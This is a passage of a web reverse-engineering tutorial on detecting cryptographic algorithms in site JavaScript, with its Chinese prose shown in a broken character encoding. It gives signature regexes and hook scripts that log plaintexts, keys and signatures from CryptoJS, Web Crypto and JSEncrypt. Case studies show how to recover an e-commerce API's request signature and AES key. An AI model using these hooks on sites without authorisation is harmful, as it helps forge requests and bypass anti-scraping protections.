<li>åçˆ¬è™«å¯¹æŠ—æŠ€æœ¯</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-61">
                                                <h2>[R60] Crypto Detection Scripts</h2>
                                                <h1>R60: åŠ å¯†ç®—æ³•è¯†åˆ«ä¸æ£€æµ‹è„šæœ¬</h1>
<h2>æ¦‚è¿°</h2>
<p>åœ¨ Web é€†å‘å·¥ç¨‹ä¸­ï¼Œè¯†åˆ«ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„åŠ å¯†ç®—æ³•æ˜¯åˆ†æçš„ç¬¬ä¸€æ­¥ã€‚é€šè¿‡è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åŠ å¯†å‡½æ•°è°ƒç”¨ç‚¹ã€è¯†åˆ«ç®—æ³•ç±»å‹ï¼Œå¹¶æå–å…³é”®å‚æ•°ã€‚æœ¬ç« ä»‹ç»åŠ å¯†ç®—æ³•çš„ç‰¹å¾è¯†åˆ«ã€è‡ªåŠ¨æ£€æµ‹æ–¹æ³•ä»¥åŠå®æˆ˜ Hook è„šæœ¬ã€‚</p>
<hr />
<h2>åŠ å¯†ç®—æ³•åŸºç¡€çŸ¥è¯†</h2>
<h3>å¸¸è§åŠ å¯†ç®—æ³•åˆ†ç±»</h3>
<h4>1. æ•£åˆ—ç®—æ³•ï¼ˆHash Functionsï¼‰</h4>
<p><strong>ç‰¹ç‚¹</strong>: å•å‘ä¸å¯é€†ï¼Œå›ºå®šé•¿åº¦è¾“å‡º</p>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>è¾“å‡ºé•¿åº¦</th>
  <th>ç‰¹å¾æ¨¡å¼</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>MD5</strong></td>
  <td>128 bit (32 hex)</td>
  <td>åŒ…å« <code>0x67452301</code>, <code>0xEFCDAB89</code> ç­‰é­”æ•°</td>
</tr>
<tr>
  <td><strong>SHA-1</strong></td>
  <td>160 bit (40 hex)</td>
  <td>åŒ…å« <code>0x67452301</code>, <code>0xEFCDAB89</code> ç­‰åˆå§‹å€¼</td>
</tr>
<tr>
  <td><strong>SHA-256</strong></td>
  <td>256 bit (64 hex)</td>
  <td>åŒ…å« <code>0x6A09E667</code>, <code>0xBB67AE85</code> ç­‰å¸¸é‡</td>
</tr>
<tr>
  <td><strong>SHA-512</strong></td>
  <td>512 bit (128 hex)</td>
  <td>64 è½®è¿ç®—ï¼Œç‰¹å¾å¸¸é‡æ•°ç»„</td>
</tr>
<tr>
  <td><strong>SM3</strong></td>
  <td>256 bit (64 hex)</td>
  <td>å›½å¯†ç®—æ³•ï¼Œåˆå§‹å€¼ <code>0x7380166F</code></td>
</tr>
</tbody>
</table>
<h4>2. å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ˆSymmetric Encryptionï¼‰</h4>
<p><strong>ç‰¹ç‚¹</strong>: åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥</p>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>å¯†é’¥é•¿åº¦</th>
  <th>å—å¤§å°</th>
  <th>ç‰¹å¾</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>AES</strong></td>
  <td>128/192/256 bit</td>
  <td>128 bit</td>
  <td>S-Box æ›¿æ¢è¡¨ï¼ŒMixColumns æ··æ·†</td>
</tr>
<tr>
  <td><strong>DES</strong></td>
  <td>56 bit</td>
  <td>64 bit</td>
  <td>16 è½® Feistel ç»“æ„</td>
</tr>
<tr>
  <td><strong>3DES</strong></td>
  <td>168 bit</td>
  <td>64 bit</td>
  <td>DES ä¸‰æ¬¡è¿­ä»£</td>
</tr>
<tr>
  <td><strong>RC4</strong></td>
  <td>40-2048 bit</td>
  <td>æµåŠ å¯†</td>
  <td>KSA å’Œ PRGA ä¸¤é˜¶æ®µ</td>
</tr>
<tr>
  <td><strong>SM4</strong></td>
  <td>128 bit</td>
  <td>128 bit</td>
  <td>å›½å¯†ç®—æ³•ï¼Œ32 è½®éçº¿æ€§è¿­ä»£</td>
</tr>
</tbody>
</table>
<h4>3. éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼ˆAsymmetric Encryptionï¼‰</h4>
<p><strong>ç‰¹ç‚¹</strong>: å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</p>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>å¯†é’¥é•¿åº¦</th>
  <th>åº”ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>RSA</strong></td>
  <td>1024/2048/4096 bit</td>
  <td>æ•°å­—ç­¾åã€å¯†é’¥äº¤æ¢</td>
</tr>
<tr>
  <td><strong>ECC</strong></td>
  <td>256/384/521 bit</td>
  <td>ç§»åŠ¨è®¾å¤‡ã€IoT</td>
</tr>
<tr>
  <td><strong>SM2</strong></td>
  <td>256 bit</td>
  <td>å›½å¯†éå¯¹ç§°ç®—æ³•</td>
</tr>
</tbody>
</table>
<h4>4. ç¼–ç ç®—æ³•ï¼ˆEncodingï¼‰</h4>
<p><strong>æ³¨æ„</strong>: ç¼–ç ä¸æ˜¯åŠ å¯†ï¼Œå¯é€†</p>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>ç‰¹å¾</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Base64</strong></td>
  <td>å­—ç¬¦é›† <code>A-Za-z0-9+/=</code>ï¼Œé•¿åº¦æ˜¯ 4 çš„å€æ•°</td>
</tr>
<tr>
  <td><strong>Base32</strong></td>
  <td>å­—ç¬¦é›† <code>A-Z2-7=</code>ï¼Œé•¿åº¦æ˜¯ 8 çš„å€æ•°</td>
</tr>
<tr>
  <td><strong>Hex</strong></td>
  <td>å­—ç¬¦é›† <code>0-9A-F</code>ï¼Œé•¿åº¦æ˜¯ 2 çš„å€æ•°</td>
</tr>
<tr>
  <td><strong>URL Encode</strong></td>
  <td>åŒ…å« <code>%XX</code> æ ¼å¼</td>
</tr>
</tbody>
</table>
<hr />
<h2>åŠ å¯†ç®—æ³•ç‰¹å¾è¯†åˆ«</h2>
<h3>1. é€šè¿‡ä»£ç ç‰¹å¾è¯†åˆ«</h3>
<h4>MD5 ç‰¹å¾æ£€æµ‹</h4>
<pre><code class="language-javascript">// æ£€æµ‹ MD5 ç®—æ³•ç‰¹å¾
function detectMD5(code) {
  const patterns = [
    // MD5 åˆå§‹åŒ–å‘é‡ï¼ˆé­”æ•°ï¼‰
    /0x67452301/i,
    /0xEFCDAB89/i,
    /0x98BADCFE/i,
    /0x10325476/i,

    // MD5 å¾ªç¯ç§»ä½å¸¸é‡
    /0xD76AA478/i,
    /0xE8C7B756/i,

    // å‡½æ•°åç‰¹å¾
    /md5|MD5/,

    // å…¸å‹æ“ä½œï¼šF = (B &amp; C) | (~B &amp; D)
    /[&amp;|~]\s*[a-z0-9_]+\s*[&amp;|]\s*[a-z0-9_]+/,
  ];

  return patterns.some((pattern) =&gt; pattern.test(code));
}
</code></pre>
<h4>AES ç‰¹å¾æ£€æµ‹</h4>
<pre><code class="language-javascript">// æ£€æµ‹ AES ç®—æ³•ç‰¹å¾
function detectAES(code) {
  const patterns = [
    // S-Box æ›¿æ¢è¡¨ç‰¹å¾å€¼
    /0x63.*0x7C.*0x77.*0x7B/, // S-Box å‰å‡ ä¸ªå€¼

    // Rijndael S-Box
    /sbox|s_box|SubBytes/i,

    // è½®å¸¸é‡ Rcon
    /rcon|round.*const/i,

    // MixColumns å¤šé¡¹å¼
    /0x02.*0x03.*0x01.*0x01/,

    // å‡½æ•°å
    /aes|AES|rijndael/i,

    // CBCã€ECB ç­‰æ¨¡å¼
    /CBC|ECB|CTR|GCM|CFB/,
  ];

  return patterns.some((pattern) =&gt; pattern.test(code));
}
</code></pre>
<h4>RSA ç‰¹å¾æ£€æµ‹</h4>
<pre><code class="language-javascript">// æ£€æµ‹ RSA ç®—æ³•ç‰¹å¾
function detectRSA(code) {
  const patterns = [
    // æ¨¡å¹‚è¿ç®—
    /mod.*exp|modular.*exponentiation/i,

    // å¤§æ•°è¿ç®—åº“
    /bigint|big.*integer|jsbn/i,

    // RSA å…³é”®å­—
    /rsa|RSA/,

    // å…¬é’¥æŒ‡æ•° e (å¸¸è§å€¼ï¼š65537 = 0x10001)
    /0x10001|65537/,

    // PKCS å¡«å……
    /pkcs.*1|oaep|pss/i,
  ];

  return patterns.some((pattern) =&gt; pattern.test(code));
}
</code></pre>
<h3>2. é€šè¿‡å¸¸é‡ç‰¹å¾è¯†åˆ«</h3>
<pre><code class="language-javascript">// åŠ å¯†ç®—æ³•å¸¸é‡æ•°æ®åº“
const CRYPTO_CONSTANTS = {
  MD5: [
    0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xd76aa478, 0xe8c7b756,
    0x242070db,
  ],

  SHA1: [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0],

  SHA256: [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c,
    0x1f83d9ab, 0x5be0cd19,
  ],

  AES_SBOX: [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b,
    0xfe, 0xd7, 0xab, 0x76,
  ],

  SM3: [
    0x7380166f, 0x4914b2b9, 0x172442d7, 0xda8a0600, 0xa96f30bc, 0x163138aa,
    0xe38dee4d, 0xb0fb0e4e,
  ],
};

// åœ¨ä»£ç ä¸­æœç´¢è¿™äº›å¸¸é‡
function findCryptoConstants(code) {
  const found = [];

  for (const [algo, constants] of Object.entries(CRYPTO_CONSTANTS)) {
    const hexConstants = constants.map(
      (c) =&gt; &quot;0x&quot; + c.toString(16).toUpperCase()
    );

    for (const constant of hexConstants) {
      if (code.includes(constant)) {
        found.push({ algorithm: algo, constant });
      }
    }
  }

  return found;
}
</code></pre>
<h3>3. é€šè¿‡è¾“å‡ºç‰¹å¾è¯†åˆ«</h3>
<pre><code class="language-javascript">// æ ¹æ®è¾“å‡ºé•¿åº¦åˆ¤æ–­å¯èƒ½çš„ç®—æ³•
function guessAlgorithmByOutputLength(output) {
  const length = output.length;

  const lengthMap = {
    32: [&quot;MD5 (hex)&quot;, &quot;MD4 (hex)&quot;],
    40: [&quot;SHA-1 (hex)&quot;, &quot;RIPEMD-160 (hex)&quot;],
    64: [&quot;SHA-256 (hex)&quot;, &quot;SM3 (hex)&quot;, &quot;RIPEMD-256 (hex)&quot;],
    128: [&quot;SHA-512 (hex)&quot;, &quot;Whirlpool (hex)&quot;],

    // Base64 ç¼–ç çš„é•¿åº¦ï¼ˆè¿‘ä¼¼ï¼‰
    24: [&quot;MD5 (base64)&quot;],
    28: [&quot;SHA-1 (base64)&quot;],
    44: [&quot;SHA-256 (base64)&quot;],
    88: [&quot;SHA-512 (base64)&quot;],
  };

  return lengthMap[length] || [&quot;Unknown&quot;];
}

// æµ‹è¯•ç¤ºä¾‹
console.log(guessAlgorithmByOutputLength(&quot;5d41402abc4b2a76b9719d911017c592&quot;));
// Output: ['MD5 (hex)', 'MD4 (hex)']
</code></pre>
<hr />
<h2>è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬</h2>
<h3>ç»¼åˆåŠ å¯†æ£€æµ‹è„šæœ¬</h3>
<pre><code class="language-javascript">// crypto-detector.js
class CryptoDetector {
  constructor() {
    this.detectedAlgorithms = new Set();
    this.suspiciousFunctions = [];
  }

  // æ‰«æå…¨å±€å¯¹è±¡
  scanGlobalObjects() {
    const cryptoLibraries = [
      &quot;CryptoJS&quot;,
      &quot;forge&quot;,
      &quot;sjcl&quot;,
      &quot;crypto&quot;,
      &quot;subtle&quot;,
      &quot;JSEncrypt&quot;,
      &quot;aesjs&quot;,
      &quot;md5&quot;,
      &quot;sha1&quot;,
      &quot;sha256&quot;,
    ];

    cryptoLibraries.forEach((lib) =&gt; {
      if (window[lib]) {
        console.log(`âœ… å‘ç°åŠ å¯†åº“: ${lib}`);
        this.detectedAlgorithms.add(lib);
      }
    });

    // æ£€æµ‹ Web Crypto API
    if (window.crypto &amp;&amp; window.crypto.subtle) {
      console.log(&quot;âœ… å‘ç° Web Crypto API&quot;);
      this.detectedAlgorithms.add(&quot;WebCrypto&quot;);
    }
  }

  // æ‰«æå·²åŠ è½½çš„ JS æ–‡ä»¶
  async scanLoadedScripts() {
    const scripts = Array.from(document.scripts);

    for (const script of scripts) {
      if (!script.src) continue;

      try {
        const response = await fetch(script.src);
        const code = await response.text();

        const algorithms = this.detectAlgorithmsInCode(code);

        if (algorithms.length &gt; 0) {
          console.log(`ğŸ“œ æ–‡ä»¶: ${script.src}`);
          console.log(`   ç®—æ³•:`, algorithms);
        }
      } catch (e) {
        console.log(`âš ï¸  æ— æ³•è¯»å–: ${script.src}`);
      }
    }
  }

  // åœ¨ä»£ç ä¸­æ£€æµ‹ç®—æ³•
  detectAlgorithmsInCode(code) {
    const algorithms = [];

    // æ£€æµ‹å„ç§ç®—æ³•
    const detectors = {
      MD5: this.detectMD5,
      &quot;SHA-1&quot;: this.detectSHA1,
      &quot;SHA-256&quot;: this.detectSHA256,
      AES: this.detectAES,
      DES: this.detectDES,
      RSA: this.detectRSA,
      Base64: this.detectBase64,
      HMAC: this.detectHMAC,
      SM3: this.detectSM3,
      SM4: this.detectSM4,
    };

    for (const [name, detector] of Object.entries(detectors)) {
      if (detector(code)) {
        algorithms.push(name);
      }
    }

    return algorithms;
  }

  // å„ç§æ£€æµ‹å‡½æ•°
  detectMD5(code) {
    return /0x67452301|0xEFCDAB89|0x98BADCFE|md5/i.test(code);
  }

  detectSHA1(code) {
    return /0x67452301.*0xEFCDAB89.*0x98BADCFE.*0x10325476.*0xC3D2E1F0|sha1/i.test(
      code
    );
  }

  detectSHA256(code) {
    return /0x6A09E667|0xBB67AE85|sha256/i.test(code);
  }

  detectAES(code) {
    return /aes|rijndael|SubBytes|MixColumns|0x63.*0x7C.*0x77/i.test(code);
  }

  detectDES(code) {
    return /\bdes\b|feistel|permutation.*choice/i.test(code);
  }

  detectRSA(code) {
    return /\brsa\b|modpow|0x10001|65537/i.test(code);
  }

  detectBase64(code) {
    return /base64|atob|btoa|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/i.test(
      code
    );
  }

  detectHMAC(code) {
    return /hmac|hash.*based.*message.*authentication/i.test(code);
  }

  detectSM3(code) {
    return /sm3|0x7380166F/i.test(code);
  }

  detectSM4(code) {
    return /sm4|0xA3B1BAC6/i.test(code);
  }

  // ç”ŸæˆæŠ¥å‘Š
  generateReport() {
    console.log(&quot;\n=== åŠ å¯†ç®—æ³•æ£€æµ‹æŠ¥å‘Š ===&quot;);
    console.log(`æ£€æµ‹åˆ°çš„åŠ å¯†åº“æ•°é‡: ${this.detectedAlgorithms.size}`);
    console.log(`æ£€æµ‹åˆ°çš„ç®—æ³•:`, Array.from(this.detectedAlgorithms));
  }
}

// ä½¿ç”¨æ–¹æ³•
const detector = new CryptoDetector();
detector.scanGlobalObjects();
detector.scanLoadedScripts().then(() =&gt; {
  detector.generateReport();
});
</code></pre>
<hr />
<h2>åŠ å¯†åº“ Hook è„šæœ¬</h2>
<h3>Hook CryptoJS</h3>
<pre><code class="language-javascript">(function () {
  if (!window.CryptoJS) {
    console.log(&quot;âš ï¸  CryptoJS æœªåŠ è½½&quot;);
    return;
  }

  console.log(&quot;ğŸ£ å¼€å§‹ Hook CryptoJS&quot;);

  // Hook æ‰€æœ‰æ•£åˆ—ç®—æ³•
  const hashAlgorithms = [
    &quot;MD5&quot;,
    &quot;SHA1&quot;,
    &quot;SHA256&quot;,
    &quot;SHA512&quot;,
    &quot;SHA3&quot;,
    &quot;RIPEMD160&quot;,
  ];

  hashAlgorithms.forEach((algo) =&gt; {
    if (CryptoJS[algo]) {
      const original = CryptoJS[algo];
      CryptoJS[algo] = function (message) {
        console.log(`ğŸ” [CryptoJS.${algo}]`);
        console.log(`   è¾“å…¥:`, message.toString());

        const result = original.apply(this, arguments);

        console.log(`   è¾“å‡º:`, result.toString());
        console.trace();

        return result;
      };
    }
  });

  // Hook AES åŠ å¯†
  if (CryptoJS.AES) {
    const originalEncrypt = CryptoJS.AES.encrypt;
    const originalDecrypt = CryptoJS.AES.decrypt;

    CryptoJS.AES.encrypt = function (message, key, cfg) {
      console.log(&quot;ğŸ” [CryptoJS.AES.encrypt]&quot;);
      console.log(&quot;   æ˜æ–‡:&quot;, message.toString());
      console.log(&quot;   å¯†é’¥:&quot;, key.toString());
      console.log(&quot;   é…ç½®:&quot;, cfg);

      const result = originalEncrypt.apply(this, arguments);

      console.log(&quot;   å¯†æ–‡:&quot;, result.toString());
      console.log(&quot;   Base64:&quot;, result.toString());
      console.trace();

      return result;
    };

    CryptoJS.AES.decrypt = function (ciphertext, key, cfg) {
      console.log(&quot;ğŸ”“ [CryptoJS.AES.decrypt]&quot;);
      console.log(&quot;   å¯†æ–‡:&quot;, ciphertext.toString());
      console.log(&quot;   å¯†é’¥:&quot;, key.toString());

      const result = originalDecrypt.apply(this, arguments);

      console.log(&quot;   æ˜æ–‡:&quot;, result.toString(CryptoJS.enc.Utf8));
      console.trace();

      return result;
    };
  }

  // Hook HMAC
  if (CryptoJS.HmacSHA256) {
    const originalHmac = CryptoJS.HmacSHA256;
    CryptoJS.HmacSHA256 = function (message, key) {
      console.log(&quot;ğŸ” [CryptoJS.HmacSHA256]&quot;);
      console.log(&quot;   æ¶ˆæ¯:&quot;, message.toString());
      console.log(&quot;   å¯†é’¥:&quot;, key.toString());

      const result = originalHmac.apply(this, arguments);

      console.log(&quot;   HMAC:&quot;, result.toString());

      return result;
    };
  }

  console.log(&quot;âœ… CryptoJS Hook å®Œæˆ&quot;);
})();
</code></pre>
<h3>Hook Web Crypto API</h3>
<pre><code class="language-javascript">(function () {
  if (!window.crypto || !window.crypto.subtle) {
    console.log(&quot;âš ï¸  Web Crypto API ä¸å¯ç”¨&quot;);
    return;
  }

  console.log(&quot;ğŸ£ å¼€å§‹ Hook Web Crypto API&quot;);

  const subtle = window.crypto.subtle;

  // Hook encrypt
  const originalEncrypt = subtle.encrypt;
  subtle.encrypt = async function (algorithm, key, data) {
    console.log(&quot;ğŸ” [crypto.subtle.encrypt]&quot;);
    console.log(&quot;   ç®—æ³•:&quot;, algorithm);
    console.log(&quot;   å¯†é’¥:&quot;, key);
    console.log(&quot;   æ•°æ®é•¿åº¦:&quot;, data.byteLength, &quot;bytes&quot;);

    // è½¬æ¢ä¸ºå¯è¯»æ ¼å¼
    const dataArray = new Uint8Array(data);
    console.log(&quot;   æ•°æ®ï¼ˆå‰100å­—èŠ‚ï¼‰:&quot;, Array.from(dataArray.slice(0, 100)));

    const result = await originalEncrypt.apply(this, arguments);

    console.log(&quot;   å¯†æ–‡é•¿åº¦:&quot;, result.byteLength, &quot;bytes&quot;);
    console.trace();

    return result;
  };

  // Hook decrypt
  const originalDecrypt = subtle.decrypt;
  subtle.decrypt = async function (algorithm, key, data) {
    console.log(&quot;ğŸ”“ [crypto.subtle.decrypt]&quot;);
    console.log(&quot;   ç®—æ³•:&quot;, algorithm);
    console.log(&quot;   å¯†é’¥:&quot;, key);
    console.log(&quot;   å¯†æ–‡é•¿åº¦:&quot;, data.byteLength, &quot;bytes&quot;);

    const result = await originalDecrypt.apply(this, arguments);

    const plaintext = new Uint8Array(result);
    console.log(&quot;   æ˜æ–‡:&quot;, new TextDecoder().decode(plaintext));

    return result;
  };

  // Hook digest
  const originalDigest = subtle.digest;
  subtle.digest = async function (algorithm, data) {
    console.log(&quot;ğŸ” [crypto.subtle.digest]&quot;);
    console.log(&quot;   ç®—æ³•:&quot;, algorithm);

    const dataArray = new Uint8Array(data);
    const text = new TextDecoder().decode(dataArray);
    console.log(&quot;   è¾“å…¥:&quot;, text);

    const result = await originalDigest.apply(this, arguments);

    // è½¬æ¢ä¸º Hex
    const hashArray = Array.from(new Uint8Array(result));
    const hashHex = hashArray
      .map((b) =&gt; b.toString(16).padStart(2, &quot;0&quot;))
      .join(&quot;&quot;);
    console.log(&quot;   å“ˆå¸Œ:&quot;, hashHex);

    return result;
  };

  // Hook sign
  const originalSign = subtle.sign;
  subtle.sign = async function (algorithm, key, data) {
    console.log(&quot;ğŸ” [crypto.subtle.sign]&quot;);
    console.log(&quot;   ç®—æ³•:&quot;, algorithm);
    console.log(&quot;   å¯†é’¥:&quot;, key);

    const result = await originalSign.apply(this, arguments);

    const sigArray = Array.from(new Uint8Array(result));
    const sigHex = sigArray
      .map((b) =&gt; b.toString(16).padStart(2, &quot;0&quot;))
      .join(&quot;&quot;);
    console.log(&quot;   ç­¾å:&quot;, sigHex);

    return result;
  };

  console.log(&quot;âœ… Web Crypto API Hook å®Œæˆ&quot;);
})();
</code></pre>
<h3>Hook JSEncrypt (RSA)</h3>
<pre><code class="language-javascript">(function () {
  if (!window.JSEncrypt) {
    console.log(&quot;âš ï¸  JSEncrypt æœªåŠ è½½&quot;);
    return;
  }

  console.log(&quot;ğŸ£ å¼€å§‹ Hook JSEncrypt&quot;);

  const originalEncrypt = JSEncrypt.prototype.encrypt;
  const originalDecrypt = JSEncrypt.prototype.decrypt;

  JSEncrypt.prototype.encrypt = function (text) {
    console.log(&quot;ğŸ” [JSEncrypt.encrypt]&quot;);
    console.log(&quot;   æ˜æ–‡:&quot;, text);
    console.log(&quot;   å…¬é’¥:&quot;, this.getPublicKey());

    const result = originalEncrypt.apply(this, arguments);

    console.log(&quot;   å¯†æ–‡:&quot;, result);
    console.trace();

    return result;
  };

  JSEncrypt.prototype.decrypt = function (text) {
    console.log(&quot;ğŸ”“ [JSEncrypt.decrypt]&quot;);
    console.log(&quot;   å¯†æ–‡:&quot;, text);

    const result = originalDecrypt.apply(this, arguments);

    console.log(&quot;   æ˜æ–‡:&quot;, result);

    return result;
  };

  console.log(&quot;âœ… JSEncrypt Hook å®Œæˆ&quot;);
})();
</code></pre>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1: è¯†åˆ«æŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•</h3>
<p><strong>åœºæ™¯</strong>: æŸç”µå•†ç½‘ç«™çš„ API è¯·æ±‚åŒ…å«ç­¾åå‚æ•° <code>sign</code></p>
<p><strong>æ­¥éª¤ 1: æ£€æµ‹åŠ å¯†åº“</strong></p>
<pre><code class="language-javascript">const detector = new CryptoDetector();
detector.scanGlobalObjects();
// è¾“å‡º: âœ… å‘ç°åŠ å¯†åº“: CryptoJS
</code></pre>
<p><strong>æ­¥éª¤ 2: Hook CryptoJS</strong></p>
<p>å‘ç°è°ƒç”¨äº† <code>CryptoJS.MD5</code>ï¼š</p>
<pre><code>ğŸ” [CryptoJS.MD5]
   è¾“å…¥: timestamp=1638360000&amp;user_id=123456&amp;secret=abc123
   è¾“å‡º: 5d41402abc4b2a76b9719d911017c592
</code></pre>
<p><strong>æ­¥éª¤ 3: åˆ†æç­¾åé€»è¾‘</strong></p>
<pre><code class="language-javascript">// è¿˜åŸç­¾åå‡½æ•°
function generateSign(timestamp, userId, secret) {
  const str = `timestamp=${timestamp}&amp;user_id=${userId}&amp;secret=${secret}`;
  return CryptoJS.MD5(str).toString();
}
</code></pre>
<h3>æ¡ˆä¾‹ 2: ç ´è§£ AES åŠ å¯†çš„è¯·æ±‚å‚æ•°</h3>
<p><strong>åœºæ™¯</strong>: è¯·æ±‚ä½“æ˜¯åŠ å¯†çš„ Base64 å­—ç¬¦ä¸²</p>
<p><strong>æ­¥éª¤ 1: Hook CryptoJS.AES</strong></p>
<pre><code>ğŸ” [CryptoJS.AES.encrypt]
   æ˜æ–‡: {&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}
   å¯†é’¥: my-secret-key-16
   é…ç½®: {mode: CBC, iv: ...}
   å¯†æ–‡: U2FsdGVkX1+... (Base64)
</code></pre>
<p><strong>æ­¥éª¤ 2: æå–åŠ å¯†å‚æ•°</strong></p>
<ul>
<li>ç®—æ³•: AES-CBC</li>
<li>å¯†é’¥: <code>my-secret-key-16</code></li>
<li>IV: (ä»é…ç½®ä¸­æå–)</li>
<li>æ¨¡å¼: CBC</li>
</ul>
<p><strong>æ­¥éª¤ 3: Python å¤ç°</strong></p>
<pre><code class="language-python">from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

def aes_encrypt(plaintext, key, iv):
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(ciphertext).decode()

# ä½¿ç”¨
key = 'my-secret-key-16'
iv = '...'  # ä» Hook ç»“æœä¸­è·å–
data = '{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}'
encrypted = aes_encrypt(data, key, iv)
</code></pre>
<hr />
<h2>å·¥å…·é›†æˆ</h2>
<h3>æµè§ˆå™¨æ’ä»¶æ£€æµ‹</h3>
<p>å¯ä»¥å°†æ£€æµ‹è„šæœ¬é›†æˆåˆ°æµè§ˆå™¨æ’ä»¶ä¸­ï¼Œå®ç°è‡ªåŠ¨åŒ–åˆ†æï¼š</p>
<pre><code class="language-javascript">// content-script.js
chrome.runtime.sendMessage({
  type: &quot;crypto_detected&quot;,
  algorithms: detector.detectedAlgorithms,
});
</code></pre>
<h3>Node.js é™æ€åˆ†æ</h3>
<pre><code class="language-javascript">const fs = require(&quot;fs&quot;);
const detector = new CryptoDetector();

const code = fs.readFileSync(&quot;target.js&quot;, &quot;utf-8&quot;);
const algorithms = detector.detectAlgorithmsInCode(code);

console.log(&quot;æ£€æµ‹åˆ°çš„ç®—æ³•:&quot;, algorithms);
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>å¤šå±‚æ£€æµ‹</strong>: ç»“åˆå…¨å±€å¯¹è±¡æ‰«æã€ä»£ç ç‰¹å¾åŒ¹é…ã€å¸¸é‡è¯†åˆ«</li>
<li><strong>åŠ¨æ€ Hook</strong>: ä¼˜å…ˆä½¿ç”¨ Hook è„šæœ¬æ•è·è¿è¡Œæ—¶è°ƒç”¨</li>
<li><strong>é™æ€åˆ†æ</strong>: å¯¹æ··æ·†ä»£ç å…ˆåæ··æ·†å†æ£€æµ‹</li>
<li><strong>äº¤å‰éªŒè¯</strong>: é€šè¿‡è¾“å…¥è¾“å‡ºç‰¹å¾éªŒè¯ç®—æ³•è¯†åˆ«ç»“æœ</li>
<li><strong>ä¿å­˜è¯æ®</strong>: è®°å½•å®Œæ•´çš„åŠ å¯†å‚æ•°ï¼ˆå¯†é’¥ã€IVã€æ¨¡å¼ç­‰ï¼‰</li>
</ol>
<hr />
<h2>ç›¸å…³å·¥å…·</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>åŠŸèƒ½</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>hash-identifier</strong></td>
  <td>å“ˆå¸Œç±»å‹è¯†åˆ«</td>
  <td>https://github.com/blackploit/hash-identifier</td>
</tr>
<tr>
  <td><strong>CyberChef</strong></td>
  <td>ç»¼åˆåŠ å¯†åˆ†æ</td>
  <td>https://gchq.github.io/CyberChef/</td>
</tr>
<tr>
  <td><strong>Ciphey</strong></td>
  <td>è‡ªåŠ¨è§£å¯†å·¥å…·</td>
  <td>https://github.com/Ciphey/Ciphey</td>
</tr>
<tr>
  <td><strong>findcrypt</strong></td>
  <td>IDA æ’ä»¶ï¼ŒæŸ¥æ‰¾åŠ å¯†å¸¸é‡</td>
  <td>https://github.com/you0708/ida/tree/master/idapython_tools/findcrypt</td>
</tr>
</tbody>
</table>
<hr />
<h2>å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>
<p>åœ¨ä¼ä¸šçº§ Web é€†å‘é¡¹ç›®ä¸­ï¼Œé™¤äº†å¼€æºå·¥å…·ï¼Œè¿˜æœ‰å¤šç§å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆå¯é€‰ã€‚ä»¥ä¸‹æ˜¯ä¸“ä¸šå·¥å…·å’ŒæœåŠ¡çš„è¯¦ç»†å¯¹æ¯”ã€‚</p>
<h3>1. å•†ä¸šåŠ å¯†åˆ†æå·¥å…·</h3>
<h4>IDA Pro + Hex-Rays (Binary Analysis)</h4>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: æ·±åº¦äºŒè¿›åˆ¶åˆ†æã€WASM é€†å‘ã€å¤æ‚åŠ å¯†ç®—æ³•è¯†åˆ«</p>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>ä¸šç•Œæ ‡å‡†çš„åæ±‡ç¼–å·¥å…·</li>
<li>å¼ºå¤§çš„ F5 åç¼–è¯‘åŠŸèƒ½</li>
<li>ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ï¼ˆfindcryptã€IDAScopeï¼‰</li>
<li>æ”¯æŒå¤šç§æ¶æ„ï¼ˆx86ã€ARMã€MIPSã€WASMï¼‰</li>
</ul>
<p><strong>åŠ£åŠ¿</strong>:</p>
<ul>
<li>ä»·æ ¼æ˜‚è´µï¼ˆä¸ªäººç‰ˆ $385ï¼Œä¸“ä¸šç‰ˆ $1,879+ï¼‰</li>
<li>å­¦ä¹ æ›²çº¿é™¡å³­</li>
<li>ä¸»è¦é’ˆå¯¹äºŒè¿›åˆ¶ï¼ŒJavaScript åˆ†æéœ€é…åˆå…¶ä»–å·¥å…·</li>
</ul>
